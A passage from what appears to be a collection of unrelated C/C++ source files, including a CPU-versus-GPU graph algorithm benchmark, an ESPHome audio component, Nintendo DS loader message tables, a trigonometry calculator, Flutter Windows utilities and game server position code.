&elapsedTime);\n        elapsedTime = 0;\n        cuda_bfs(csr_graph, graph.bfs_src, &elapsedTime);\n        printf(\"GPU BFS cost time: %f ms\\n\", elapsedTime);\n        elapsedTime = 0;\n\n        bfs_checker(graph, cpu_bfs_result, gpu_bfs_result);\n    }\n\n    if (graph.sup_wcc) {\n        std::vector<std::vector<int>> cpu_wcc_result;\n        start = clock();\n        cpu_wcc_result = CPU_connected_components<double>(graph.OUTs);\n        end = clock();\n        printf(\"CPU WCC cost time: %f ms\\n\", (double)(end - start) / CLOCKS_PER_SEC * 1000);\n\n        std::vector<std::vector<int>> gpu_wcc_result;\n        gpu_wcc_result = gpu_connected_components(csr_graph, &elapsedTime);\n        elapsedTime = 0;\n        gpu_connected_components(csr_graph, &elapsedTime);\n        printf(\"GPU WCC cost time: %f ms\\n\", elapsedTime);\n        elapsedTime = 0;\n\n        wcc_checker(graph, cpu_wcc_result, gpu_wcc_result);\n    }\n\n    if (graph.sup_sssp) {\n        start = clock();\n        std::vector<double> cpu_sssp_result = CPU_shortest_paths(graph.OUTs, graph.sssp_src);\n        end = clock();\n        printf(\"CPU SSSP cost time: %f ms\\n\", (double)(end - start) / CLOCKS_PER_SEC * 1000);\n    \n        elapsedTime = 0;\n        std::vector<double> gpu_sssp_result(graph.V, 0);\n        Workfront_Sweep(csr_graph, graph.sssp_src, gpu_sssp_result, &elapsedTime);\n        printf(\"GPU SSSP cost time: %f ms\\n\", elapsedTime);\n\n        sssp_checker(graph, cpu_sssp_result, gpu_sssp_result);\n    }\n\n    if (graph.sup_pr) {\n        start = clock();\n        CPU_PageRank(graph);\n        end = clock();\n        printf(\"CPU PageRank cost time: %f ms\\n\", (double)(end - start) / CLOCKS_PER_SEC * 1000);\n\n        elapsedTime = 0;\n        PageRank(graph, &elapsedTime);\n        printf(\"GPU PageRank cost time: %f ms\\n\", elapsedTime);\n    }\n\n    /*if (graph.sup_cdlp) {\n        start = clock();\n        CPU_Community_Detection(graph);\n        end = clock();\n        printf(\"CPU Community Detection cost time: %f ms\\n\", (double)(end - start) / CLOCKS_PER_SEC * 1000);\n\n        elapsedTime = 0;\n        Community_Detection(graph, &elapsedTime);\n        printf(\"GPU Community Detection cost time: %f ms\\n\", elapsedTime);\n        elapsedTime = 0;\n    }*/\n\n    return 0;\n}",
    "#include \"nabu.h\"\n\n#ifdef USE_ESP_IDF\n\n#include <driver/i2s.h>\n#include <string.h>\n\n#include <vector>\n\n// #include <audio_element.h>\n// #include <audio_event_iface.h>\n// #include <audio_pipeline.h>\n// #include <downmix.h>\n// #include <driver/i2s.h>\n// #include <filter_resample.h>\n// #include <http_stream.h>\n// #include <i2s_stream.h>\n// #include <mp3_decoder.h>\n// #include <raw_stream.h>\n\n// #include \"i2s_stream_mod.h\"\n// #include \"sdk_ext.h\"\n\n// #define INDEX_MUSIC_STREAM 0\n// #define INDEX_TTS_STREAM 1\n// #define TRANSMIT_TIME 500\n\n#include \"esphome/core/log.h\"\n\nnamespace esphome {\nnamespace nabu {\n\nstatic const char *const TAG = \"nabu\";\n\nvoid NabuComponent::setup() {\n  // audio_event_iface_cfg_t evt_cfg = AUDIO_EVENT_IFACE_DEFAULT_CFG();\n  // this->pipeline_event_ = audio_event_iface_init(&evt_cfg);\n\n  // this->setup_pipeline_mix_();\n  // this->setup_pipeline_music_();\n  // this->setup_pipeline_tts_();\n  // this->setup_pipeline_mic_();\n\n  // audio_pipeline_run(this->pipeline_mic_);\n}\n\nvoid NabuComponent::loop() {\n  // audio_event_iface_msg_t msg{};\n  // audio_event_iface_listen(this->pipeline_event_, &msg, 0);\n\n  // if (this->state_ == State::STARTING) {\n  //   ESP_LOGD(TAG, \"Starting mix pipeline\");\n  //   audio_pipeline_run(this->pipeline_mix_);\n  // this->state_ = State::IDLE;\n\n  // this->play_music(\"http://192.168.68.75:8000/Charly%20Bliss/Young%20Enough/\"\n  //                  \"06%20-%20Young%20Enough.mp3\");\n  // }\n  // audio_event_iface_discard(this->pipeline_event_);\n\n  // if ((this->state_ == State::PREPARING_MUSIC) &&\n  //     (audio_element_get_state(this->mp3_decoder_) == AEL_STATE_RUNNING)) {\n  //   audio_element_info_t music_info{};\n  //   audio_element_getinfo(this->mp3_decoder_, &music_info);\n  //   ESP_LOGD(TAG, \"Received music info\");\n\n  //   // Change resample filter to match music source\n  //   rsp_filter_change_src_info(this->resample_music_,\n  //   music_info.sample_rates,\n  //                              music_info.channels, music_info.bits);\n\n  //   this->stop_music();\n\n  //   // Run music pipeline\n  //   this->state_ = State::PLAYING_MUSIC;\n  //   audio_element_set_uri(this->http_reader_, this->music_uri_.c_str());\n  //   audio_pipeline_run(this->pipeline_music_);\n  // }\n}\n\n// ----------------------------------------------------------------------------\n\nvoid NabuComponent::start_i2s() {\n  if (this->i2s_started_) {\n    return;\n  }\n\n  ESP_LOGD(TAG, \"Starting I2S\");\n  i2s_driver_config_t i2s_driver_cfg = {\n      .mode = (i2s_mode_t)(I2S_MODE_SLAVE | I2S_MODE_RX | I2S_MODE_TX),\n      .sample_rate = 16000,\n      .bits_per_sample = I2S_BITS_PER_SAMPLE_32BIT,\n      // .channel_format = I2S_CHANNEL_FMT_ONLY_LEFT,\n      .channel_format = I2S_CHANNEL_FMT_RIGHT_LEFT,\n      .communication_format = I2S_COMM_FORMAT_STAND_I2S,\n      .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,\n      .dma_buf_count = 8,\n      .dma_buf_len = 128,\n      // .dma_buf_count = 4,\n      // .dma_buf_len = 256,\n      .use_apll = false,\n      .tx_desc_auto_clear = false,\n      // .tx_desc_auto_clear = true,\n      // .fixed_mclk = 0,\n      // .fixed_mclk = 24576000,\n      // .mclk_multiple = I2S_MCLK_MULTIPLE_DEFAULT,\n      .bits_per_chan = I2S_BITS_PER_CHAN_DEFAULT,\n  };\n  i2s_driver_install(this->get_port(), &i2s_driver_cfg, 0, nullptr);\n\n  i2s_pin_config_t pin_config = this->get_pin_config();\n  i2s_set_pin(this->get_port(), &pin_config);\n  this->i2s_started_ = true;\n}\n\nvoid NabuComponent::play_music(const std::string &uri) {\n  // this->stop_music();\n\n  ESP_LOGD(TAG, \"Playing: %s\", uri.c_str());\n  // this->music_uri_ = uri;\n  // audio_element_set_uri(this->http_reader_, this->music_uri_.c_str());\n  // audio_element_set_uri(this->http_reader_, uri.c_str());\n  // audio_pipeline_run(this->pipeline_music_);\n\n  // Preroll HTTP reader and MP3 decoder to get music info (see loop)\n  // this->state_ = State::PREPARING_MUSIC;\n\n  // if (audio_element_run(this->http_reader_) != ESP_OK) {\n  //   ESP_LOGE(TAG, \"Starting http reader failed\");\n  // }\n  // if (audio_element_run(this->mp3_decoder_) != ESP_OK) {\n  //   ESP_LOGE(TAG, \"Starting MP3 decoder failed\");\n  // }\n  // if (audio_element_resume(this->http_reader_, 0, 2000 / portTICK_RATE_MS) !=\n  //     ESP_OK) {\n  //   ESP_LOGE(TAG, \"Resuming http reader failed\");\n  // }\n  // if (audio_element_resume(this->mp3_decoder_, 0, 2000 / portTICK_RATE_MS) !=\n  //     ESP_OK) {\n  //   ESP_LOGE(TAG, \"Resuming MP3 decoder failed\");\n  // }\n\n  // ESP_LOGD(TAG, \"Waiting for music info\");\n}\n\nvoid NabuComponent::stop_music() {\n  // audio_pipeline_stop(this->pipeline_music_);\n  // audio_pipeline_reset_items_state(this->pipeline_music_);\n  // audio_pipeline_reset_ringbuffer(this->pipeline_music_);\n}\n\nvoid NabuComponent::pause_music() {\n  // audio_pipeline_pause(this->pipeline_music_);\n}\n\nvoid NabuComponent::resume_music() {\n  // audio_pipeline_resume(this->pipeline_music_);\n}\n\n// ----------------------------------------------------------------------------\n\n// void NabuComponent::setup_pipeline_mix_() {\n",
    "\r\n#include <stdio.h>\r\n\r\n#include <NDS.h>\r\n\r\n#include \"message.h\"\r\n\r\nchar\t*errmsg[14];\r\nchar\t*cnfmsg[11];\r\nchar\t*barmsg[4];\r\nchar\t*cmd_m[4];\r\nchar\t*t_msg[22];\r\nchar\t*savmsg[6];\r\n\r\nstatic\tchar\t*errmsg_j[14] = {\r\n\t\t\t\"FAT\u306e\u521d\u671f\u5316\u306b\u5931\u6557\u3057\u307e\u3057\u305f\",\t\t\t// 0\r\n\t\t\t\"\u9069\u5207\u306aDLDI\u30d1\u30c3\u30c1\u3092\u884c\u3063\u3066\u304f\u3060\u3055\u3044\",\t\t// 1\r\n\t\t\t\"Slot2\u62e1\u5f35\u30d1\u30c3\u30af\u304c\u30bb\u30c3\u30c8\u3055\u308c\u3066\u3044\u307e\u305b\u3093\",\t// 2\r\n\t\t\t\"\u6700\u521d\u304b\u3089\u3084\u308a\u76f4\u3057\u3066\u304f\u3060\u3055\u3044\",\t\t\t// 3\r\n\t\t\t\"SRAM\u306eSAVE\uff83\uff9e\uff70\uff80\u304c\u3001\u6d88\u5931\u3057\u3066\u3044\u307e\u3057\u305f\",\t\t// 4\r\n\t\t\t\"SAV\uff8c\uff67\uff72\uff99\u306e\u51e6\u7406\u306f\u884c\u3048\u307e\u305b\u3093\",\t\t\t// 5\r\n\t\t\t\"32MB\u4ee5\u4e0a\u306e\u30d5\u30a1\u30a4\u30eb\u306f\u6271\u3048\u307e\u305b\u3093\",\t\t// 6\r\n\t\t\t\"\u6307\u5b9a\u3057\u305f\u30d5\u30a1\u30a4\u30eb\u306f\u5927\u304d\u3059\u304e\u307e\u3059\",\t\t// 7\r\n\t\t\t\"16MB\u4ee5\u4e0a\u306e\u30d5\u30a1\u30a4\u30eb\u306f\u6271\u3048\u307e\u305b\u3093\",\t\t// 8\r\n\t\t\t\"Flash 1Mb\u306eSAVE\u30bf\u30a4\u30d7\u306f\u3001\",\t\t\t// 9\r\n\t\t\t\"[EXP128K]\u3067\u53d6\u308a\u6271\u3046\u4e8b\u304c\u3067\u304d\u307e\u305b\u3093\",\t\t// 10\r\n\t\t\t\"SAV\uff8c\uff67\uff72\uff99\u304c\u3042\u308a\u307e\u305b\u3093\uff01\",\t\t\t// 11\r\n\t\t\t\"SAV\uff8c\uff67\uff72\uff99\u3092\u524a\u9664\u3057\u3066\u3044\u307e\u305b\u304b\uff1f\",\t\t\t// 12\r\n\t\t\t\"(A):\u78ba\u8a8d\"\t\t\t\t\t// 13\r\n};\r\n\r\nstatic\tchar\t*errmsg_e[14] = {\r\n\t\t\t\"FAT initialization failed \",\t\t\t// 0\r\n\t\t\t\"Please apply the appropriate DLDI Patch.\",\t// 1\r\n\t\t\t\"Slot2 expansion pack not found \",\t\t// 2\r\n\t\t\t\"Please redo from start.\",\t\t\t// 3\r\n\t\t\t\"SRAM save data not found \",\t\t\t// 4\r\n\t\t\t\"Can't  process to SAV file.\",\t\t\t// 5\r\n\t\t\t\"Can't load a file above 32MB\",\t\t\t// 6\r\n\t\t\t\"Selected file too big.\",\t\t\t// 7\r\n\t\t\t\"Can't load a file above 16MB\",\t\t\t// 8\r\n\t\t\t\"The SAVE type of Flash 1Mb\",\t\t\t// 9\r\n\t\t\t\"Can't be treated with [EXP128K].\",\t\t// 10\r\n\t\t\t\"SAV file not found!\",\t\t\t\t// 11\r\n\t\t\t\" delete the SAV file?\",\t\t\t// 12\r\n\t\t\t\"(A):Confirm\"\t\t\t\t\t// 13\r\n};\r\n\r\n\r\nstatic\tchar\t*cnfmsg_j[11] = {\r\n\t\t\t\"(A):\u5b9f\u884c, (B):\u53d6\u6d88\",\t\t\t\t// 0\r\n\t\t\t\"\u73fe\u5728\u306eSRAM\u306b\u3042\u308bSAVE\u30c7\u30fc\u30bf\u3092\",\t\t\t// 1\r\n\t\t\t\"SAV\u30d5\u30a1\u30a4\u30eb\u306b\u4fdd\u5b58\u3057\u307e\u3059\",\t\t\t// 2\r\n\t\t\t\"SAV\u30d5\u30a1\u30a4\u30eb\u306e\u30c7\u30fc\u30bf\u3092\",\t\t\t// 3\r\n\t\t\t\"SRAM\u306eSAVE\u306b\u30ed\u30fc\u30c9\u3057\u307e\u3059\",\t\t\t// 4\r\n\t\t\t\"\u5168SRAM\u9818\u57df\u3092\u30d0\u30c3\u30af\u30a2\u30c3\u30d7\u30d5\u30a1\u30a4\u30eb\",\t\t// 5\r\n\t\t\t\"(SRAM.BIN)\u304b\u3089\u5fa9\u65e7\u3057\u307e\u3059\",\t\t\t// 6\r\n\t\t\t\"\u5168SRAM\u9818\u57df\u3092\u30d0\u30c3\u30af\u30a2\u30c3\u30d7\u3068\u3057\u3066\",\t\t// 7\r\n\t\t\t\"SRAM.BIN\u306b\u9000\u907f\u3057\u307e\u3059\",\t\t\t\t// 8\r\n\t\t\t\"\u3053\u306eSlot2\u62e1\u5f35\u30d1\u30c3\u30af\u3092 GBA ExpLoader\u7528\u306b\",\t// 9\r\n\t\t\t\"\u8a2d\u5b9a(SRAM\u306f\u5931\u308f\u308c\u307e\u3059)\u3057\u3066\u3044\u3044\u3067\u3059\u304b\uff1f\"\t// 10\r\n};\r\n\r\nstatic\tchar\t*cnfmsg_e[11] = {\r\n\t\t\t\"(A):Run, (B):Cancel\",\t\t\t\t// 0\r\n\t\t\t\"Write save data in SRAM\",\t\t\t// 1\r\n\t\t\t\" to SAV file\",\t\t\t\t\t// 2\r\n\t\t\t\"Load save data in SRAM\",\t\t\t// 3\r\n\t\t\t\" from SAV file\",\t\t\t\t// 4\r\n\t\t\t\"Restore all data in SRAM\",\t\t\t// 5\r\n\t\t\t\" from file SRAM.BIN\",\t\t\t\t// 6\r\n\t\t\t\"Backup all data in SRAM\",\t\t\t// 7\r\n\t\t\t\" to file SRAM.BIN\",\t\t\t\t// 8\r\n\t\t\t\"May I set this Slot2 expansion pack\",\t\t// 9\r\n\t\t\t\"for GBA ExpLoader?\"\t\t\t\t// 10\r\n};\r\n\r\n\r\nstatic\tchar\t*barmsg_j[4] = {\r\n\t\t\t\"  NOR\u3092\u6d88\u53bb\u4e2d...  \",\t\t\t\t// 0\r\n\t\t\t\" NOR\u306b\u30b3\u30d4\u30fc\u4e2d... \",\t\t\t\t// 1\r\n\t\t\t\" RAM\u306b\u30ed\u30fc\u30c9\u4e2d... \",\t\t\t\t// 2\r\n\t\t\t\"  ROM\u3092\u89e3\u6790\u4e2d...  \"\t\t\t\t// 3\r\n};\r\n\r\nstatic\tchar\t*barmsg_e[4] = {\r\n\t\t\t\"  Erasing NOR...   \",\t\t\t\t// 0\r\n\t\t\t\" Copying to NOR... \",\t\t\t\t// 1\r\n\t\t\t\" Loading to RAM... \",\t\t\t\t// 2\r\n\t\t\t\" Analyzing ROM...  \"\t\t\t\t// 3\r\n};\r\n\r\n\r\nstatic\tchar\t*cmd_m_j[4] = {\r\n\t\t\t\"  \u632f\u52d5\u30ec\u30d9\u30eb \uff1a (\u5c0f)  \",\r\n\t\t\t\"  \u632f\u52d5\u30ec\u30d9\u30eb \uff1a (\u4e2d)  \",\r\n\t\t\t\"  \u632f\u52d5\u30ec\u30d9\u30eb \uff1a (\u5927)  \",\r\n\t\t\t\" \u30d6\u30e9\u30a6\u30b6\u7528\u62e1\u5f35\u30e1\u30e2\u30ea \"\r\n};\r\n\r\nstatic\tchar\t*cmd_m_e[4] = {\r\n\t\t\t\" Rumble level: Weak   \",\r\n\t\t\t\" Rumble level: Medium \",\r\n\t\t\t\" Rumble level: Strong \",\r\n\t\t\t\" Expansion RAM        \"\r\n};\r\n\r\n\r\nstatic\tchar\t*t_msg_j[22] = {\r\n\t\t\t\"\u9078\u629e\u4e2d\u306e\u30b2\u30fc\u30e0\",\r\n\t\t\t\" PSRAM\u30e2\u30fc\u30c9\",\r\n\t\t\t\"(A):RAM\u306b\u30b2\u30fc\u30e0\u3092\u30ed\u30fc\u30c9\u3057\u3066\u5b9f\u884c    \",\r\n\t\t\t\"(B):SRAM\u306eSAVE\uff83\uff9e\uff70\uff80\u3092 SAV\uff8c\uff67\uff72\uff99\u306b\u4fdd\u5b58 \",\r\n\t\t\t\"  \u5168SRAM\uff83\uff9e\uff70\uff80\u9818\u57df (X):\u9000\u907f, (Y):\u5fa9\u65e7\",\r\n\t\t\t\"(R):\u30e2\u30fc\u30c9\u5909\u66f4                    \",\r\n\t\t\t\"(L)/(R):\u30e2\u30fc\u30c9\u5909\u66f4                \",\r\n\t\t\t\"(L):\u30e2\u30fc\u30c9\u5909\u66f4                    \",\r\n\t\t\t\"  NOR\u30e2\u30fc\u30c9 \",\r\n\t\t\t\"(A):\u30b2\u30fc\u30e0\u306e\u30b3\u30d4\u30fc  (X):NOR\u3092\u5b9f\u884c  \",\r\n\t\t\t\"(B):SRAM\u306eSAVE\uff83\uff9e\uff70\uff80\u3092 SAV\uff8c\uff67\uff72\uff99\u306b\u4fdd\u5b58 \",\t\t// 10\r\n\t\t\t\"(Y):SAV\uff8c\uff67\uff72\uff99\u3092 SRAM\u306eSAVE\u306b\u30ed\u30fc\u30c9   \",\r\n\t\t\t\"[%s] %d \u30b2\u30fc\u30e0\",\r\n\t\t\t\"\u6d88\u5931\u3082\u3057\u304f\u306f\u65b0\u898f\u72b6\u614b\",\r\n\t\t\t\"\u73fe\u5728\u306eSRAM\u306eSAVE\",\r\n\t\t\t\" == GBA\u30d5\u30a1\u30a4\u30eb\u304c\u3042\u308a\u307e\u305b\u3093 == \",\r\n\t\t\t\"\u521d\u671f\u5316\u4e2d....\",\r\n\t\t\t\"  \u62e1\u5f35\u30e2\u30fc\u30c9\",\r\n\t\t\t\"(A):3in1\u3092\u8a2d\u5b9a\u3057\u3066\u30ea\u30bb\u30c3\u30c8\",\r\n\t\t\t\"(L):\u30e2\u30fc\u30c9\u5909\u66f4                   \",\r\n\t\t\t\"(R):\u30d6\u30e9\u30a6\u30b6\u7528\u62e1\u5f35\u30e1\u30e2\u30ea         \",\r\n\t\t\t\" SDRAM\u30e2\u30fc\u30c9\",\r\n};\r\n\r\nstatic\tchar\t*t_msg_e[22] = {\r\n\t\t\t\"Selected game\",\r\n\t\t\t\"  PSRAM Mode \",\r\n\t\t\t\"(A):Run (B):Write SRAM to SAV file\",\r\n\t\t\t\"(X):Backup whole SRAM to SRAM.BIN \",\r\n\t\t\t\"(Y):Restore SRAM.BIN to SRAM      \",\r\n\t\t\t\"(R):Change mode                 \",\r\n\t\t\t\"(L)/(R):Change mode             \",\r\n\t\t\t\"(L):Change mode                 \",\r\n\t\t\t\"   NOR mode  \",\r\n\t\t\t\"(A):Copy game (X):Run game in NOR \",\r\n\t\t\t\"(B):Write SRAM to SAV file        \",\t\t// 10\r\n\t\t\t\"(Y):Load SAV file to SRAM         \",\r\n\t\t\t\"[%s] %d game\",\r\n\t\t\t\"Empty or new state\",\r\n\t\t\t\"Current SRAM Save\",\r\n\t\t\t\" == GBA file not found == \",\r\n\t\t\t\"Initialize....\",\r\n\t\t\t\"Expansion mode\",\r\n\t\t\t\"(A):Set mode and soft reset\",\r\n\t\t\t\"(L):Change mode                \",\r\n\t\t\t\"(R):Expansion RAM              \",\r\n\t\t\t\"  SDRAM Mode \",\r\n};\r\n\r\n\r\nstatic\tchar\t*savmsg_j[6] = {\r\n\t\t\t\" SRAM\u306bSAVE\u30c7\u30fc\u30bf\u3092\u30ed\u30fc\u30c9\",\t\t// 0\r\n\t\t\t\"(A):\u9078\u629e\u3057\u305f\u30d5\u30a1\u30a4\u30eb\u3092\u30ed\u30fc\u30c9\",\t\t// 1\r\n\t\t\t\"(B):\u30ed\u30fc\u30c9\u3057\u306a\u3044(\u65b0\u898f\u30b2\u30fc\u30e0)\",\t\t// 2\r\n\t\t\t\" SRAM\u306eSAVE\u30c7\u30fc\u30bf\u3092\u4fdd\u5b58  \",\t\t// 3\r\n\t\t\t\"(A):\u9078\u629e\u3057\u305f\u30d5\u30a1\u30a4\u30eb\u306b\u4fdd\u5b58\",\t\t// 4\r\n\t\t\t\"(B):\u4fdd\u5b58\u3057\u306a\u3044(\u53d6\u6d88)\",\t\t\t// 5\r\n};\r\n\r\nstatic\tchar\t*savmsg_e[6] = {\r\n\t\t\t\" Load SRAM from SAV file \",\t\t// 0\r\n\t\t\t\"(A):Load from selected file\",\t\t// 1\r\n\t\t\t\"(B):No load(New Game)\",\t\t// 2\r\n\t\t\t\" Write SRAM to SAV file  \",\t\t// 3\r\n\t\t\t\"(A):write to selected file\",\t\t// 4\r\n\t\t\t\"(B):No write(Cancel)\",\t\t\t// 5\r\n};\r\n\r\n\r\nvoid setLangMsg()\r\n{\r\n\tu32\tUserLang = 0;\r\n\tint\ti;\r\n\r\n\tUserLang = PersonalData->_user_data.language;\r\n\r\n\tif(UserLang != 0) {\r\n\t\tfor(i = 0; i < 14; i++)\r\n\t\t\terrmsg[i] = errmsg_e[i];\r\n\t\tfor(i = 0; i < 11; i++)\r\n\t\t\tcnfmsg[i] = cnfmsg_e[i];\r\n\t\tfor(i = 0; i < 4; i++)\r\n\t\t\tbarmsg[i] = barmsg_e[i];\r\n\t\tfor(i = 0; i < 4; i++)\r\n\t\t\tcmd_m[i] = cmd_m_e[i];\r\n\t\tfor(i = 0; i < 22; i++)\r\n\t\t\tt_msg[i] = t_msg_e[i];\r\n\t\tfor(i = 0; i ",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <float.h>\r\n#include<conio.h>\r\n\r\n#include \"TriMath.h\"\r\n#include \"test.h\"\r\n\r\n\r\ntypedef enum{\r\n\tmain_interf = 0,\r\n\t\r\n} new_interf;\r\n\r\nnew_interf interf = main_interf;\r\n\r\n//\u5b9a\u4e49\u51fd\u6570 \r\ndouble show_main_interf(void);\r\ndouble show(void);\r\ndouble arc_scan();\r\ndouble angel_scan(double pi);\r\n\r\nint main(int argc, char** argv) {\r\n    double accu = 0.0000001;\r\n    int n = 15; //\u6cf0\u52d2\u5c55\u5f00\u7cbe\u5ea6 \r\n    double pi = cal_pi(accu);\r\n    double x, rad;\r\n    int key;\r\n\t\r\n\twhile(1)\r\n\t{\r\n\t\tsystem(\"cls\");\r\n\t\tshow();\r\n\t\tscanf(\"%d\", &key);\r\n\t\t\r\n\t\tif (key == 9)\r\n\t\t{\r\n\t\t\treturn 0;\r\n\t\t}\r\n\t\t//\u9009\u62e9\u8ba1\u7b97\u6a21\u5f0f \r\n\t\tswitch (key)\r\n    \t{\r\n\t    \tcase 1:\r\n\t\t\t\trad = angel_scan(pi);\r\n\t    \t\tprintf(\"sin(%lf) = %lf\\n\", rad, taylor_sin(rad, n, pi));\r\n\t    \t\tbreak;\r\n\t    \tcase 2:\r\n\t\t\t\trad = angel_scan(pi);\r\n\t    \t\tprintf(\"cos(%lf) = %lf\\n\", rad, taylor_cos(rad, n, pi));\r\n\t    \t\tbreak;\r\n\t    \tcase 3:\r\n\t    \t\tdouble tan; \r\n\t\t\t\trad = angel_scan(pi);\r\n\t\t\t\ttan = taylor_tan(rad, n, pi);\r\n\t\t\t\tif (tan == DBL_MAX)\r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"tan(%lf) \u4e0d\u5b58\u5728\\n\", rad);\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"tan(%lf) = %lf\\n\", rad, tan);\r\n\t\t\t\t} \r\n\t    \t\tbreak;   \t\t    \t\r\n\t        case 4:\r\n\t        \tx = arc_scan();\r\n\t        \tif(x ==2){\r\n\t        \t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tprintf(\"arcsin(%lf) = %lf\\n\", x, cmp_arcs(x, n, accu, pi));\r\n\t            break;\r\n\t        case 5:\r\n\t\t\t\tx = arc_scan();\r\n\t\t\t\tif(x ==2){\r\n\t        \t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tprintf(\"arccos(%lf) = %lf\\n\", x, cmp_arcc(x, n, accu, pi));\r\n\t            break;\r\n\t        case 6:\r\n\t\t\t\tx = arc_scan();\r\n\t\t\t\tprintf(\"arctan(%lf) = %lf\\n\", x, cmp_arct(x, n, accu, pi));\r\n\t            break;       \r\n\t        default:\r\n\t            printf(\"\u65e0\u6548\u7684\u8f93\u5165\\n\");\r\n//\t            return 0; \r\n\t            break;\r\n    \t}\r\n\t    printf(\"\u8bf7\u6309\u4efb\u610f\u952e\u7ee7\u7eed...\\n\");\r\n        getch();\r\n\t}\r\n\treturn 0;\r\n}\r\n\r\ndouble show_main_interf(void){\r\n\tinterf = main_interf;\r\n//\tsystem(\"cls\");\r\n\tprintf(\"Welcome to TriCal programme, you can calculate the value of any trigonometric function!\\n\");\r\n\tprintf(\"1. Calculate a sine function.\\n\");\r\n\tprintf(\"2. Calculate a cosine function.\\n\");\r\n\tprintf(\"3. Calculate a tangent function.\\n\");\r\n\tprintf(\"4. Calculate a arcsin function.\\n\");\r\n\tprintf(\"5. Calculate a arccos function.\\n\");\r\n\tprintf(\"6. Calculate a arctan function.\\n\");\r\n\tprintf(\"\u8bf7\u8f93\u5165\u5bf9\u5e94\u51fd\u6570\u7684\u5e8f\u53f7, \u8f93\u5165\u6570\u5b579\u9000\u51fa\u7a0b\u5e8f.\\n\");\r\n\treturn 0;\r\n}\r\n\r\ndouble show(void){\r\n\tswitch (interf){\r\n\t\tcase 0:\r\n\t\t\treturn show_main_interf();\r\n\t\tdefault:\r\n\t\t\treturn DBL_MAX;\r\n\t}\r\n} \r\n\r\ndouble angel_scan(double pi){\r\n\tdouble rad, angle;\r\n    int mode;\r\n\tprintf(\"\u8bf7\u9009\u62e9\u8f93\u5165 1. \u5f27\u5ea6 rad \u6216 2. \u89d2\u5ea6 angle\uff1a\");\r\n\tscanf(\"%d\", &mode);\r\n\t\r\n\tswitch (mode)\r\n\t{\r\n\t\tcase 1:\r\n\t\t\tprintf(\"\u8bf7\u8f93\u5165\u5f27\u5ea6 rad \u7684\u503c\uff1a\");\r\n\t\t\tscanf(\"%lf\", &rad);\r\n\t\t\tbreak;\r\n\t\tcase 2:\r\n\t\t\tprintf(\"\u8bf7\u8f93\u5165\u89d2\u5ea6 angle \u7684\u503c\uff1a\");\r\n\t\t\tscanf(\"%lf\", &angle);\r\n\t\t\trad = angle_2_rad(angle, pi);\r\n\t\t\tbreak;\r\n\t\tdefault:\r\n    \t\tprintf(\"\u9519\u8bef\u8f93\u5165\\n\");\r\n    \t\tprintf(\"\u8bf7\u8f93\u5165\u5f27\u5ea6 rad \u7684\u503c\uff1a\");\r\n\t\t\tscanf(\"%lf\", &rad);\r\n    \t\tbreak; \r\n\t}\r\n\treturn rad;\r\n}\r\n \r\ndouble arc_scan(){\r\n\tdouble x;\r\n\tdouble error = 2;\r\n\tprintf(\"\u8bf7\u8f93\u5165 x \u7684\u503c\uff1a\");\r\n\tscanf(\"%lf\", &x);\r\n\t\r\n\tif (x < -1 || x > 1) {\r\n\t\tprintf(\"\u9519\u8bef\uff1ax \u7684\u503c\u5fc5\u987b\u5728 -1 \u548c 1 \u4e4b\u95f4\u3002\\n\");\r\n\t\treturn error;\r\n\t}\r\n\telse{\r\n\t\treturn x;\r\n\t} \r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "// Copyright 2024 Black Tek Server Authors. All rights reserved.\n// Use of this source code is governed by the GPL-2.0 License that can be found in the LICENSE file.\n\n#include \"otpch.h\"\n\n#include \"position.h\"\n\nstd::ostream& operator<<(std::ostream& os, const Position& pos)\n{\n\tos << \"( \" << std::setw(5) << std::setfill('0') << pos.x;\n\tos << \" / \" << std::setw(5) << std::setfill('0') << pos.y;\n\tos << \" / \" << std::setw(3) << std::setfill('0') << pos.getZ();\n\tos << \" )\";\n\treturn os;\n}\n\nstd::ostream& operator<<(std::ostream& os, const Direction& dir)\n{\n\tswitch (dir) {\n\t\tcase DIRECTION_NORTH:\n\t\t\tos << \"North\";\n\t\t\tbreak;\n\n\t\tcase DIRECTION_EAST:\n\t\t\tos << \"East\";\n\t\t\tbreak;\n\n\t\tcase DIRECTION_WEST:\n\t\t\tos << \"West\";\n\t\t\tbreak;\n\n\t\tcase DIRECTION_SOUTH:\n\t\t\tos << \"South\";\n\t\t\tbreak;\n\n\t\tcase DIRECTION_SOUTHWEST:\n\t\t\tos << 